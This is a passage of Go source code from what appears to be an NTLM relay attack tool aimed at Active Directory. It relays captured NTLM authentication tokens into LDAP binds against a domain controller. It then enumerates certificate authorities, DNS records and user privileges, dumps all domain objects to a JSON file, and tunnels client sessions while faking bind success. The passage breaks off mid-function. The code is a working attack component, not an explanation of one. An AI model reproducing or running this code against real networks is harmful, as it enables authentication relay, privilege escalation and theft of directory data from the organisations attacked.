package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
	ber "github.com/go-asn1-ber/asn1-ber"
)

type CA struct {
    cn   			string
    host			string
    ip  			string
	targetURL 		string
}

// LDAP tags
const (
	LDAPTagBindRequest       = 0
	LDAPTagBindResponse      = 1
	LDAPTagSearchRequest     = 3
	LDAPTagSearchResultEntry = 4
	LDAPTagSearchResultDone  = 5
)

var ldapMessageID atomic.Int64

type LDAPClient struct {
	sess *Session
	upR  *bufio.Reader
	upW  *bufio.Writer
}

func (l *LDAPClient) Init(s *Session) error {
	l.sess = s
	l.upR = bufio.NewReader(s.Up.conn)
	l.upW = bufio.NewWriter(s.Up.conn)
	return nil
}

func (l *LDAPClient) KeepAlive() error {
	mid := ldapMessageID.Add(1)
	if err := sendRootDSEQuery(l.sess.Up.conn, mid); err != nil {
		if err == io.EOF {
			return nil
		}
		return err
	}
	if err := consumeSearchDone(l.upR, mid, 3*time.Second); err != nil {
		if err == io.EOF {
			return nil
		}
		return err
	}
	return nil
}

func (l *LDAPClient) SkipAuthentication(down net.Conn) error { return nil }
func (l *LDAPClient) Tunnel(down net.Conn) error              { return pumpLDAP(down, l.sess.Up.conn, l.upR) }
func (l *LDAPClient) Kill() error                             { return l.sess.Up.conn.Close() }
func (l *LDAPClient) IsAdmin() (bool, error)                  { return false, nil }

func sendLDAPMessage(conn net.Conn, messageID int64, protocolOp *ber.Packet) error {
	msg := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
	msg.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, messageID, "Message ID"))
	msg.AppendChild(protocolOp)
	_, err := conn.Write(msg.Bytes())
	return err
}

func sendRootDSEQuery(conn net.Conn, messageID int64) error {
	search := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagSearchRequest, nil, "Search Request")
	search.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Base DN"))
	search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "Scope: baseObject"))
	search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "DerefAliases: never"))
	search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
	search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 120, "Time Limit"))
	search.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))
	filter := ber.Encode(ber.ClassContext, ber.TypePrimitive, 7, nil, "Present Filter")
	filter.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "objectClass", "Attribute Type"))
	search.AppendChild(filter)
	attrs := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
	for _, name := range []string{
		"subschemaSubentry", "dsServiceName", "namingContexts", "defaultNamingContext",
		"schemaNamingContext", "configurationNamingContext", "rootDomainNamingContext",
		"supportedControl", "supportedLDAPVersion", "supportedLDAPPolicies",
		"supportedSASLMechanisms", "dnsHostName", "ldapServiceName", "serverName",
		"supportedCapabilities",
	} {
		attrs.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, name, "Attribute"))
	}
	search.AppendChild(attrs)
	return sendLDAPMessage(conn, messageID, search)
}

// sendLDAPBind sends an LDAP SASL bind with provided creds (NTLM/SPNEGO blob).
func sendLDAPBind(conn net.Conn, messageID int64, creds []byte) error {
	bind := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagBindRequest, nil, "Bind Request")
	bind.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 3, "Version"))
	bind.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "", "Bind DN"))

	sasl := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "SASL")
	sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "GSS-SPNEGO", "Mechanism"))
	if len(creds) > 0 {
		sasl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(creds), "Credentials"))
	}
	bind.AppendChild(sasl)

	return sendLDAPMessage(conn, messageID, bind)
}

func readLDAPMessage(br *bufio.Reader) (*ber.Packet, error) { return ber.ReadPacket(br) }

func parseBindResponse(p *ber.Packet) (resultCode int, serverCreds []byte, err error) {
	if len(p.Children) < 2 {
		return 0, nil, fmt.Errorf("invalid LDAP message")
	}
	bindResp := p.Children[1]
	if bindResp.ClassType != ber.ClassApplication || bindResp.Tag != LDAPTagBindResponse {
		return 0, nil, fmt.Errorf("not bind response")
	}
	if len(bindResp.Children) < 1 {
		return 0, nil, fmt.Errorf("short bind response")
	}
	rc64, ok := bindResp.Children[0].Value.(int64)
	if !ok {
		return 0, nil, fmt.Errorf("unexpected resultCode type")
	}
	resultCode = int(rc64)

	for i := 1; i < len(bindResp.Children); i++ {
		child := bindResp.Children[i]
		if child.ClassType == ber.ClassContext && child.Tag == 7 {
			if len(child.ByteValue) > 0 {
				serverCreds = child.ByteValue
				break
			}
			if len(child.Children) > 0 {
				for _, inner := range child.Children {
					if len(inner.ByteValue) > 0 {
						serverCreds = inner.ByteValue
						break
					}
					if s, ok := inner.Value.(string); ok && len(s) > 0 {
						serverCreds = []byte(s)
						break
					}
					if b, ok := inner.Value.([]byte); ok && len(b) > 0 {
						serverCreds = b
						break
					}
				}
			}
			if serverCreds == nil {
				if b, ok := child.Value.([]byte); ok && len(b) > 0 {
					serverCreds = b
				}
				if s, ok := child.Value.(string); ok && len(s) > 0 {
					serverCreds = []byte(s)
				}
			}
		}
	}
	if serverCreds == nil {
		raw := bindResp.Bytes()
		if raw != nil {
			if idx := bytes.Index(raw, []byte("NTLMSSP\x00")); idx >= 0 {
				serverCreds = raw[idx:]
			}
		}
	}
	if debug && serverCreds != nil {
		fmt.Printf("parseBindResponse: extracted %d bytes; hex(prefix): %x\n", len(serverCreds), serverCreds[:min(16, len(serverCreds))])
	}
	return resultCode, serverCreds, nil
}

func min(a, b int) int { if a < b { return a }; return b }

func relayToLDAP(up *rawUpstream, ntlmType uint32, token []byte) (serverSaslCreds []byte, bindSuccess bool, dcDnsHostName string, err error) {
	atomic.StoreInt32(&up.busy, 1)
	defer atomic.StoreInt32(&up.busy, 0)
	mid := ldapMessageID.Add(1)
	if ntlmType == 1 {
		if err = sendRootDSEQuery(up.conn, mid); err != nil {
			return nil, false, "", err
		}
		// drain until SearchResultDone for our mid
		for {
			p, err := readLDAPMessage(up.br)
			if err != nil {
				return nil, false, "", err
			}
			if len(p.Children) != 2 {
				return nil, false, "", fmt.Errorf("invalid LDAP msg")
			}
			msgID, _ := p.Children[0].Value.(int64)
			if msgID != mid {
				continue
			}
			op := p.Children[1]
			// Extract configurationNamingContext and defaultNamingContext from SearchResultEntry
			if op.ClassType == ber.ClassApplication && op.Tag == 4 { // SearchResultEntry
				if len(op.Children) > 1 {
					attrs := op.Children[1]
					for _, attr := range attrs.Children {
						if len(attr.Children) > 1 {
							if attrName, ok := attr.Children[0].Value.(string); ok {
								if len(attr.Children[1].Children) > 0 {
									if dn, ok := attr.Children[1].Children[0].Value.(string); ok {
										switch attrName {
										case "configurationNamingContext":
											up.configDN = dn
										case "defaultNamingContext":
											up.baseDN = dn
										case "dnsHostName":
											up.dcDnsHostName = dn
										}
									}
								}
							}
						}
					}
				}
			}
			if op.ClassType == ber.ClassApplication && op.Tag == LDAPTagSearchResultDone {
				break
			}
		}
		mid = ldapMessageID.Add(1)
		if err = sendLDAPBind(up.conn, mid, token); err != nil {
			return nil, false, "", err
		}
		p, err := readLDAPMessage(up.br)
		if err != nil {
			return nil, false, "", err
		}
		msgID, _ := p.Children[0].Value.(int64)
		if msgID != mid {
			return nil, false, "", fmt.Errorf("messageID mismatch")
		}
		code, creds, err := parseBindResponse(p)
		if err != nil {
			return nil, false, "", err
		}
		if code != 14 { // saslBindInProgress
			return nil, false, "", fmt.Errorf("expected saslBindInProgress, got %d", code)
		}
		return creds, false, "", nil
	}
	if ntlmType == 3 {
		mid = ldapMessageID.Add(1)
		if err = sendLDAPBind(up.conn, mid, token); err != nil {
			return nil, false, "", err
		}
		p, err := readLDAPMessage(up.br)
		if err != nil {
			return nil, false, "", err
		}
		msgID, _ := p.Children[0].Value.(int64)
		if msgID != mid {
			return nil, false, "", fmt.Errorf("messageID mismatch")
		}
		code, _, err := parseBindResponse(p)
		if err != nil {
			return nil, false, "", err
		}
		if code != 0 {
			return nil, false, "", fmt.Errorf("expected success(0), got %d", code)
		}
		return nil, true, up.dcDnsHostName, nil
	}
	return nil, false, "", fmt.Errorf("unsupported NTLM type %d", ntlmType)
}

func queryCertificateAuthorities(up *rawUpstream, configDN string) ([]CA, error) {
    mid := ldapMessageID.Add(1)
    baseDN := fmt.Sprintf("CN=Enrollment Services,CN=Public Key Services,CN=Services,%s", configDN)
    
    search := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagSearchRequest, nil, "Search Request")
    search.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, baseDN, "Base DN"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 1, "Scope: singleLevel"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "DerefAliases"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 120, "Time Limit"))
    search.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))
    
    filter := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "equalityMatch")
    filter.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "objectClass", "Attribute"))
    filter.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "pKIEnrollmentService", "Value"))
    search.AppendChild(filter)
    
    attrs := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
    for _, name := range []string{"cn", "dNSHostName"} {
        attrs.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, name, "Attribute"))
    }
    search.AppendChild(attrs)
    
    if err := sendLDAPMessage(up.conn, mid, search); err != nil {
        return nil, err
    }
    
    var cas []CA
    for {
        p, err := readLDAPMessage(up.br)
        if err != nil {
            return nil, err
        }
        if len(p.Children) != 2 {
            return nil, fmt.Errorf("invalid LDAP msg")
        }
        msgID, _ := p.Children[0].Value.(int64)
        if msgID != mid {
            continue
        }
        op := p.Children[1]
        
        if op.ClassType == ber.ClassApplication && op.Tag == 4 {
            var ca CA
            if len(op.Children) > 1 {
                attrs := op.Children[1]
                for _, attr := range attrs.Children {
                    if len(attr.Children) > 1 {
                        if attrName, ok := attr.Children[0].Value.(string); ok {
                            if len(attr.Children[1].Children) > 0 {
                                if val, ok := attr.Children[1].Children[0].Value.(string); ok {
                                    if attrName == "cn" {
                                        ca.cn = val
                                    } else if attrName == "dNSHostName" {
                                        ca.host = val
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if ca.cn != "" {
                cas = append(cas, ca)
            }
        }
        
        if op.ClassType == ber.ClassApplication && op.Tag == LDAPTagSearchResultDone {
            break
        }
    }
    
    return cas, nil
}

func queryDNSRecord(up *rawUpstream, baseDN, hostname string) string {
    if hostname == "" {
        return ""
    }
    
    // Extract short hostname
    shortName := hostname
    if idx := strings.Index(hostname, "."); idx != -1 {
        shortName = hostname[:idx]
    }
    
    // Extract domain from baseDN
    zoneDN := fmt.Sprintf("DC=DomainDnsZones,%s", baseDN)
    
    mid := ldapMessageID.Add(1)
    search := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagSearchRequest, nil, "Search Request")
    search.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, zoneDN, "Base DN"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 2, "Scope: subtree"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "DerefAliases"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 1, "Size Limit"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 30, "Time Limit"))
    search.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))
    
    // Filter: (&(objectClass=dnsNode)(dc=HOSTNAME))
    andFilter := ber.Encode(ber.ClassContext, ber.TypeConstructed, 0, nil, "and")
    
    eq1 := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "equalityMatch")
    eq1.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "objectClass", "Attribute"))
    eq1.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "dnsNode", "Value"))
    andFilter.AppendChild(eq1)
    
    eq2 := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "equalityMatch")
    eq2.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "dc", "Attribute"))
    eq2.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, shortName, "Value"))
    andFilter.AppendChild(eq2)
    
    search.AppendChild(andFilter)
    
    attrs := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
    attrs.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "dnsRecord", "Attribute"))
    search.AppendChild(attrs)
    
    if err := sendLDAPMessage(up.conn, mid, search); err != nil {
        return ""
    }
    
    var ip string
    for {
        p, err := readLDAPMessage(up.br)
        if err != nil || len(p.Children) != 2 {
            break
        }
        msgID, _ := p.Children[0].Value.(int64)
        if msgID != mid {
            continue
        }
        op := p.Children[1]
        
		if op.ClassType == ber.ClassApplication && op.Tag == 4 {
			if len(op.Children) > 1 {
				attrs := op.Children[1]
				for _, attr := range attrs.Children {
					if len(attr.Children) > 1 && len(attr.Children[1].Children) > 0 {
						// dnsRecord is binary - get bytes from buffer
						if attr.Children[1].Children[0].Data != nil {
							data := attr.Children[1].Children[0].Data.Bytes()
							if len(data) >= 28 {
								// IP is at offset 24 for A records
								ip = fmt.Sprintf("%d.%d.%d.%d", data[24], data[25], data[26], data[27])
							}
						}
					}
				}
			}
		}
        
        if op.ClassType == ber.ClassApplication && op.Tag == LDAPTagSearchResultDone {
            break
        }
    }
    
    return ip
}

func queryUserByAccount(up *rawUpstream, baseDN, samAccountName string) (map[string]interface{}, error) {
    mid := ldapMessageID.Add(1)
    
    search := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagSearchRequest, nil, "Search Request")
    search.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, baseDN, "Base DN"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 2, "Scope: wholeSubtree"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "DerefAliases"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 1, "Size Limit"))
    search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 30, "Time Limit"))
    search.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))
    
    filter := ber.Encode(ber.ClassContext, ber.TypeConstructed, 3, nil, "equalityMatch")
    filter.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "sAMAccountName", "Attribute"))
    filter.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, samAccountName, "Value"))
    search.AppendChild(filter)
    
    attrs := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
    for _, name := range []string{"memberOf", "adminCount", "distinguishedName", "objectSid"} {
        attrs.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, name, "Attribute"))
    }
    search.AppendChild(attrs)
    
    if err := sendLDAPMessage(up.conn, mid, search); err != nil {
        return nil, err
    }
    
    var result map[string]interface{}
    for {
        p, err := readLDAPMessage(up.br)
        if err != nil {
            return nil, err
        }
        if len(p.Children) != 2 {
            return nil, fmt.Errorf("invalid LDAP msg")
        }
        
        msgID, _ := p.Children[0].Value.(int64)
        if msgID != mid {
            continue
        }
        
        op := p.Children[1]
        if op.ClassType == ber.ClassApplication && op.Tag == 4 {
            result = make(map[string]interface{})
            if len(op.Children) > 0 {
                if dnVal, ok := op.Children[0].Value.(string); ok {
                    result["dn"] = dnVal
                    result["distinguishedName"] = dnVal
                }
            }
            if len(op.Children) > 1 {
                attrs := op.Children[1]
                for _, attr := range attrs.Children {
                    if len(attr.Children) > 1 {
                        if attrName, ok := attr.Children[0].Value.(string); ok {
                            valuesNode := attr.Children[1]
                            switch attrName {
                            case "memberOf":
                                var groups []string
                                for _, v := range valuesNode.Children {
                                    if v.Data != nil {
                                        groups = append(groups, string(v.Data.Bytes()))
                                    } else if val, ok := v.Value.(string); ok {
                                        groups = append(groups, val)
                                    }
                                }
                                result["memberOf"] = groups
                            case "adminCount":
                                if len(valuesNode.Children) > 0 {
                                    if valuesNode.Children[0].Data != nil {
                                        adminCountStr := string(valuesNode.Children[0].Data.Bytes())
                                        if ac, err := strconv.Atoi(adminCountStr); err == nil {
                                            result["adminCount"] = ac
                                        }
                                    } else if val, ok := valuesNode.Children[0].Value.(int64); ok {
                                        result["adminCount"] = int(val)
                                    }
                                }
                            case "distinguishedName":
                                if len(valuesNode.Children) > 0 {
                                    if valuesNode.Children[0].Data != nil {
                                        result["distinguishedName"] = string(valuesNode.Children[0].Data.Bytes())
                                    } else if val, ok := valuesNode.Children[0].Value.(string); ok {
                                        result["distinguishedName"] = val
                                    }
                                }
                            case "objectSid":
                                if len(valuesNode.Children) > 0 {
                                    if valuesNode.Children[0].Data != nil {
                                        result["objectSid"] = sidToString(valuesNode.Children[0].Data.Bytes())
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        
        if op.ClassType == ber.ClassApplication && op.Tag == LDAPTagSearchResultDone {
            break
        }
    }
    
    return result, nil
}

func guidToString(b []byte) string {
	if len(b) != 16 {
		return ""
	}
	d1 := binary.LittleEndian.Uint32(b[0:4])
	d2 := binary.LittleEndian.Uint16(b[4:6])
	d3 := binary.LittleEndian.Uint16(b[6:8])
	return fmt.Sprintf("%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x",
		d1, d2, d3, b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15])
}

func filetimeToTime(ftStr string) (time.Time, error) {
	const ticksPerSecond = 1e7
	const unixToFiletimeOffset = 11644473600 // seconds between 1601-01-01 and 1970-01-01
	n, err := strconv.ParseInt(ftStr, 10, 64)
	if err != nil {
		return time.Time{}, err
	}
	sec := n / ticksPerSecond
	return time.Unix(sec-unixToFiletimeOffset, 0).UTC(), nil
}

func sidToString(b []byte) string {
	if len(b) < 8 {
		return ""
	}
	rev := b[0]
	count := int(b[1])
	ia := uint64(b[2])<<40 | uint64(b[3])<<32 | uint64(b[4])<<24 |
		uint64(b[5])<<16 | uint64(b[6])<<8 | uint64(b[7])
	sid := fmt.Sprintf("S-%d-%d", rev, ia)
	offset := 8
	for i := 0; i < count && offset+4 <= len(b); i++ {
		sub := binary.LittleEndian.Uint32(b[offset : offset+4])
		sid += fmt.Sprintf("-%d", sub)
		offset += 4
	}
	return sid
}


func queryAllDomainObjects(up *rawUpstream, baseDN string) error {
	now := time.Now().Format("15:04:05")
	log.Printf("%s%s%s [LDAP] Starting domain dump from base DN: %s", Grey, now, Reset, baseDN)

	data := make(map[string]interface{})

	cookie := []byte{}
	pageSize := int64(500)
	totalCount := 0
	pageNum := 0

	up.conn.SetReadDeadline(time.Now().Add(10 * time.Minute))
	defer up.conn.SetReadDeadline(time.Time{})

	for {
		pageNum++
		mid := ldapMessageID.Add(1)

		msg := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "LDAP Message")
		msg.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, mid, "Message ID"))

		search := ber.Encode(ber.ClassApplication, ber.TypeConstructed, LDAPTagSearchRequest, nil, "Search Request")
		search.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, baseDN, "Base DN"))
		search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 2, "Scope: wholeSubtree"))
		search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagEnumerated, 0, "DerefAliases"))
		search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 0, "Size Limit"))
		search.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, 300, "Time Limit"))
		search.AppendChild(ber.NewBoolean(ber.ClassUniversal, ber.TypePrimitive, ber.TagBoolean, false, "Types Only"))

		filter := ber.NewString(ber.ClassContext, ber.TypePrimitive, 7, "objectClass", "Present Filter")
		search.AppendChild(filter)

		attrSeq := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Attributes")
		search.AppendChild(attrSeq)

		msg.AppendChild(search)

		controls := ber.Encode(ber.ClassContext, ber.TypeConstructed, 0, nil, "Controls")
		pageControl := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Control")
		pageControl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, "1.2.840.113556.1.4.319", "Control Type"))

		controlValue := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "Control Value Sequence")
		controlValue.AppendChild(ber.NewInteger(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, pageSize, "Page Size"))
		controlValue.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(cookie), "Cookie"))

		pageControl.AppendChild(ber.NewString(ber.ClassUniversal, ber.TypePrimitive, ber.TagOctetString, string(controlValue.Bytes()), "Encoded Control Value"))
		controls.AppendChild(pageControl)
		msg.AppendChild(controls)

		if _, err := up.conn.Write(msg.Bytes()); err != nil {
			return fmt.Errorf("failed to send paged query: %v", err)
		}

		if debug {
			now := time.Now().Format("15:04:05")
			log.Printf("%s%s%s [LDAP] Page %d query sent (messageID=%d), reading results...", Grey, now, Reset, pageNum, mid)
		}

		for {
			p, err := readLDAPMessage(up.br)
			if err != nil {
				return fmt.Errorf("failed to read response: %v", err)
			}
			if len(p.Children) < 2 {
				return fmt.Errorf("invalid LDAP msg: only %d children", len(p.Children))
			}
			msgID, _ := p.Children[0].Value.(int64)
			if msgID != mid {
				continue
			}
			op := p.Children[1]

			// SearchResultEntry
			if op.ClassType == ber.ClassApplication && op.Tag == 4 {
				obj := make(map[string][]string)
				var dn string

				if len(op.Children) > 0 {
					if dnVal, ok := op.Children[0].Value.(string); ok {
						dn = dnVal
						obj["dn"] = []string{dn}
					}
				}
				if len(op.Children) > 1 {
					attrs := op.Children[1]
					for _, attr := range attrs.Children {
						if len(attr.Children) > 1 {
							if attrName, ok := attr.Children[0].Value.(string); ok {
								var values []string
								valuesNode := attr.Children[1]
								for _, valNode := range valuesNode.Children {
									if valNode.Data != nil {
										b := valNode.Data.Bytes()

										switch attrName {
										case "objectGUID":
											values = append(values, guidToString(b))

										case "objectSid", "mS-DS-CreatorSID":
											values = append(values, sidToString(b))

										case "whenCreated", "whenChanged", "dSCorePropagationData":
											s := string(b)
											if t, err := time.Parse("20060102150405.0Z", s); err == nil {
												values = append(values, t.UTC().Format(time.RFC3339))
											} else {
												values = append(values, s)
											}

										case "pwdLastSet", "accountExpires", "lastLogon", "lastLogoff", "badPasswordTime":
											s := string(b)
											if s == "9223372036854775807" {
												values = append(values, "never")
											} else if t, err := filetimeToTime(s); err == nil {
												values = append(values, t.UTC().Format(time.RFC3339))
											} else {
												values = append(values, s)
											}

										default:
											values = append(values, string(b))
										}
									} else if valStr, ok := valNode.Value.(string); ok {
										values = append(values, valStr)
									}
								}
								obj[attrName] = values
							}
						}
					}
				}

				totalCount++
				if debug {
					if totalCount == 1 || totalCount%500 == 0 {
						now := time.Now().Format("15:04:05")
						log.Printf("%s%s%s [LDAP] Received %d total objects...", Grey, now, Reset, totalCount)
					}
				}

				// Build data structure
				objectClasses := obj["objectClass"]
				categoryKey := "Unknown"

				hasUser := contains(objectClasses, "user")
				hasComputer := contains(objectClasses, "computer")
				hasGroup := contains(objectClasses, "group")
				hasOU := contains(objectClasses, "organizationalUnit")

				if hasUser && !hasComputer {
					categoryKey = "Users"
				} else if hasComputer {
					categoryKey = "Computers"
				} else if hasGroup {
					categoryKey = "Groups"
				} else if hasOU {
					categoryKey = "OUs"
				}

				if _, exists := data[categoryKey]; !exists {
					data[categoryKey] = []interface{}{}
				}

				data[categoryKey] = append(data[categoryKey].([]interface{}), obj)
			}

			// SearchResultDone
			if op.ClassType == ber.ClassApplication && op.Tag == 5 {
				if debug {
					now := time.Now().Format("15:04:05")
					log.Printf("%s%s%s [LDAP] Page %d complete", Grey, now, Reset, pageNum)
				}

				// Extract cookie
				cookie = []byte{}
				if len(p.Children) >= 3 {
					controls := p.Children[2]
					if controls.ClassType == ber.ClassContext && controls.Tag == 0 {
						for _, control := range controls.Children {
							if len(control.Children) >= 2 {
								if oid, ok := control.Children[0].Value.(string); ok && oid == "1.2.840.113556.1.4.319" {
									valueIndex := 1
									if len(control.Children) == 3 {
										valueIndex = 2
									}
									if control.Children[valueIndex].Data != nil {
										controlValueBytes := control.Children[valueIndex].Data.Bytes()
										controlValuePacket := ber.DecodePacket(controlValueBytes)
										if len(controlValuePacket.Children) >= 2 {
											if controlValuePacket.Children[1].Data != nil {
												cookie = controlValuePacket.Children[1].Data.Bytes()
												if debug {
													now := time.Now().Format("15:04:05")
													log.Printf("%s%s%s [LDAP] Extracted cookie with length %d", Grey, now, Reset, len(cookie))
												}
											}
										}
									}
								}
							}
						}
					}
				}

				break
			}

			if op.ClassType == ber.ClassApplication && op.Tag == 19 {
				continue
			}
		}

		if len(cookie) == 0 {
			break
		}

		if debug {
			now := time.Now().Format("15:04:05")
			log.Printf("%s%s%s [LDAP] Continuing to next page with cookie...", Grey, now, Reset)
		}
	}

	if err := os.MkdirAll("dump", 0755); err != nil {
		return err
	}
	jsonData, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		return err
	}
	if err := os.WriteFile("dump/domain_dump.json", jsonData, 0644); err != nil {
		return err
	}
	now = time.Now().Format("15:04:05")
	log.Printf("%s%s%s [LDAP]%s Dumped %d total objects to dump/domain_dump.json%s", Grey, now, Reset, Green, totalCount, Reset)
	return nil
}

// Helper functions
func contains(slice []string, str string) bool {
    for _, v := range slice {
        if strings.EqualFold(v, str) {
            return true
        }
    }
    return false
}

func getFirst(obj map[string][]string, key string) string {
    if vals, ok := obj[key]; ok && len(vals) > 0 {
        return vals[0]
    }
    return ""
}

func getUserAccountControl(obj map[string][]string) int64 {
    if uacStr := getFirst(obj, "userAccountControl"); uacStr != "" {
        if uac, err := strconv.ParseInt(uacStr, 10, 64); err == nil {
            return uac
        }
    }
    return 0
}

// wait for SearchResultDone for given message ID
func consumeSearchDone(br *bufio.Reader, mid int64, d time.Duration) error {
	deadline := time.Now().Add(d)
	for {
		if time.Now().After(deadline) {
			return fmt.Errorf("ldap keepalive timeout")
		}
		p, err := ber.ReadPacket(br)
		if err != nil {
			if err == io.EOF { return nil }  // treat EOF as idle
			return err
		}
		if len(p.Children) < 2 {
			continue
		}
		id, ok := p.Children[0].Value.(int64)
		if !ok || id != mid {
			continue
		}
		op := p.Children[1]
		if op.ClassType == ber.ClassApplication && op.Tag == LDAPTagSearchResultDone {
			return nil
		}
	}
}

// copy both ways while filtering downstream BindRequests
func pumpLDAP(down net.Conn, up net.Conn, upR *bufio.Reader) error {
	downR := bufio.NewReader(down)
	errCh := make(chan error, 2)

	// upstream -> downstream
	go func() {
		_, err := io.Copy(down, upR)
		errCh <- err
	}()

	// downstream -> upstream with Bind and Unbind filters
	go func() {
		for {
			pkt, err := ber.ReadPacket(downR)
			if err != nil {
				errCh <- err
				return
			}

			if len(pkt.Children) >= 2 {
				msgID := int64(0)
				if v, ok := pkt.Children[0].Value.(int64); ok {
					msgID = v
				}
				op := pkt.Children[1]

				// Drop UnbindRequest [APPLICATION 2] so upstream stays open
				if op.ClassType == ber.ClassApplication && op.Tag == 2 {
					// No response for Unbind per RFC. Just ignore and let client close.
					continue
				}

				// Drop client BindRequest and synthesize success locally
				if op.ClassType == ber.ClassApplication && op.Tag == LDAPTagBindRequest {
